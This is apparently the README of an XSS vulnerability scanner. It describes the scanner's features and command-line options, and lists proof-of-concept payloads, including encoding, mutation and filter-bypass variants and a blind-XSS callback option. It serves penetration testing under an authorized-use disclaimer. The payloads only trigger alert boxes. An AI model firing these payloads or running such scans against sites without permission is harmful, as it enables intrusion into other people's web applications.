<div align="center">
  <img src="https://img.shields.io/badge/XSS-HUNTER%20v3.0-red?style=for-the-badge&logo=python" alt="XSS-HUNTER">
  <img src="https://img.shields.io/badge/Reflected-Stored-blue?style=for-the-badge" alt="XSS Types">
  <img src="https://img.shields.io/badge/DOM-Analysis-yellow?style=for-the-badge" alt="DOM">
  <img src="https://img.shields.io/badge/Blind-Callback-orange?style=for-the-badge" alt="Blind">
  <br>
  <img src="https://img.shields.io/github/last-commit/aBadRoy/Python-based-Reflected-XSS-scanner?style=flat-square" alt="Last Commit">
  <img src="https://img.shields.io/github/repo-size/aBadRoy/Python-based-Reflected-XSS-scanner?style=flat-square" alt="Repo Size">
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" alt="License">
  <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python" alt="Python">
</div>

```ascii
  ██╗  ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
   ╚███╔╝ ███████╗███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
   ██╔██╗ ╚════██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
  ██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

<h1 align="center">XSS-HUNTER <sub>v3.0</sub></h1>

<p align="center">
  <strong>Advanced Cross-Site Scripting (XSS) Scanner — Reflected · Stored · DOM · Blind</strong>
</p>

<p align="center">
  <code>A Python-powered offensive security tool for detecting and validating XSS vulnerabilities across multiple contexts with 100+ payloads, automated crawling, and headless browser verification.</code>
</p>

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Payload Coverage](#payload-coverage)
- [Detection Methods](#detection-methods)
- [Examples](#examples)
- [Changelog](#changelog)
- [Disclaimer](#disclaimer)
- [Author](#author)

---

## Features

| Feature | Description |
|---------|-------------|
| **Reflected XSS** | 3 detection methods (direct, normalized, URL-decoded) across 100+ payloads |
| **Stored XSS** | Two-pass verification — inject payload, then probe all pages for persistence |
| **DOM-based XSS** | Static analysis of JavaScript for dangerous sinks (`document.write`, `innerHTML`, `eval`, `location`, etc.) |
| **Blind XSS** | External callback support for out-of-band detection |
| **Context-Aware** | 20+ injection contexts (HTML, attribute, script, URL, style, template, mutation, etc.) |
| **Auto-Crawler** | Discovers URLs, forms, and parameters up to configurable depth |
| **WAF Detection** | Identifies Web Application Firewalls blocking requests |
| **Encoding Bypass** | Unicode, HTML entity, base64, mixed-case payload variants |
| **Concurrent** | Multi-threaded scanning with configurable thread count |
| **CSP Bypass** | Angular JS sandbox escape and meta refresh payloads |
| **HTML Report** | Professional dark-theme report with vulnerability summary |
| **Headless Ready** | Optional Playwright integration for browser-based execution verification |

---

## Installation

```bash
# Clone
git clone https://github.com/aBadRoy/Python-based-Reflected-XSS-scanner.git
cd Python-based-Reflected-XSS-scanner

# Install dependencies
pip install -r requirements.txt

# Optional: headless browser support
pip install playwright
playwright install chromium
```

---

## Usage

```bash
# Basic reflected XSS scan
python scanner.py --url "http://target.com/search?q=test"

# POST scan with cookies
python scanner.py --url "http://target.com/login" \
  --method POST \
  --cookie "PHPSESSID=abc123; security=low"

# Full scan: reflected + stored + DOM
python scanner.py --url "http://target.com" \
  --stored --dom \
  --depth 2 --threads 10

# Blind XSS with external callback
python scanner.py --url "http://target.com/feedback" \
  --method POST \
  --blind "https://your-webhook.io/xss-callback"
```

### Options

| Argument | Description | Default |
|----------|-------------|---------|
| `--url` | Target URL **(required)** | — |
| `--method` | HTTP method (`GET`/`POST`) | `GET` |
| `--cookie` | Session cookie string | `None` |
| `--params` | Comma-separated parameters (auto-discovers if omitted) | auto |
| `--threads` | Concurrent threads | `5` |
| `--depth` | Crawl depth for endpoint discovery | `1` |
| `--timeout` | Request timeout (seconds) | `15` |
| `--stored` | Enable stored XSS detection | `False` |
| `--dom` | Enable DOM-based XSS analysis | `False` |
| `--blind` | Blind XSS callback URL | `None` |
| `--headless` | Use Playwright for browser verification | `False` |

---

## Payload Coverage

The scanner ships with **100+ payloads** across **20+ categories**:

### HTML Context
`<script>alert(1)</script>` · `<img src=x onerror=alert(1)>` · `<svg/onload=alert(1)>` · `<marquee onstart=alert(1)>` · `<details open ontoggle=alert(1)>` · `<body onload=alert(1)>` · `<input autofocus onfocus=alert(1)>` · `<video><source onerror=alert(1)>` · `<iframe srcdoc="<script>alert(1)</script>">`

### Attribute Context
`" autofocus onfocus=alert(1)` · `javascript:alert(1)` · `" onmouseover=alert(1) x="` · `" style=x:expression(alert(1))`

### Script Context
`</script><script>alert(1)</script>` · `';alert(1);//` · `${alert(1)}` · `1;alert(1)`

### Encoding Bypass
`\u003cscript\u003e` · `&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;` · `%6A%61%76%61%73%63%72%69%70%74:alert(1)` · `<ScRiPt>`

### CSP Bypass
Angular sandbox escape · Meta refresh · CDN-hosted library injection

### Mutation XSS
`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`

---

## Detection Methods

| Level | Method | Description |
|-------|--------|-------------|
| 1 | **Direct match** | Exact payload string found in response body |
| 2 | **Normalized match** | Whitespace-normalized comparison (evades simple filters) |
| 3 | **Decoded match** | URL-decoded response comparison |
| — | **Event analysis** | Checks if event handlers from payload survive in rendered HTML |
| — | **Script analysis** | Detects active script tags with alert/prompt/confirm in response |

---

## Examples

```bash
# Test against Google's XSS Game (Level 1)
python scanner.py --url "https://xss-game.appspot.com/level1/frame?query=test"

# Scan a form for stored XSS
python scanner.py --url "http://localhost:8080/guestbook" \
  --method POST \
  --params "name,message" \
  --stored --depth 2

# Full recon + scan on a target
python scanner.py --url "http://testphp.vulnweb.com/search.php" \
  --params "searchFor,category" \
  --dom --threads 8

# Blind XSS with Burp Collaborator
python scanner.py --url "http://target.com/contact" \
  --method POST \
  --params "name,email,message" \
  --blind "http://your-collaborator.burpcollaborator.net/x"
```

---

## Changelog

### v3.0 (Current)
- Complete rewrite of scanning engine
- 100+ payloads across 20 injection contexts
- Stored XSS (2-pass verification)
- DOM-based XSS (JavaScript sink analysis)
- Blind XSS with external callback support
- Automatic crawling (URLs, forms, parameters)
- WAF detection
- 3 reflection detection methods
- Multi-threaded scanning
- Professional HTML report with vulnerability summary

### v1.0 (Original)
- Basic reflected XSS detection
- 3 injection contexts
- Simple HTML report

---

## Disclaimer

> **FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**
>
> This tool is designed to help security professionals identify XSS vulnerabilities in systems they **own** or have **explicit written permission** to test. Unauthorized use against systems without consent is illegal.
>
> The author assumes **zero liability** for misuse or damages caused by this software.

---

## Author

**aBadRoy**
- GitHub: [github.com/aBadRoy](https://github.com/aBadRoy)
- Security researcher · Penetration tester · CTF enthusiast

---

<p align="center">
  <sub><code># XSS-HUNTER v3.0 | Payloads: 100+ | Contexts: 20+ | Detection: 3 methods</code></sub>
</p>
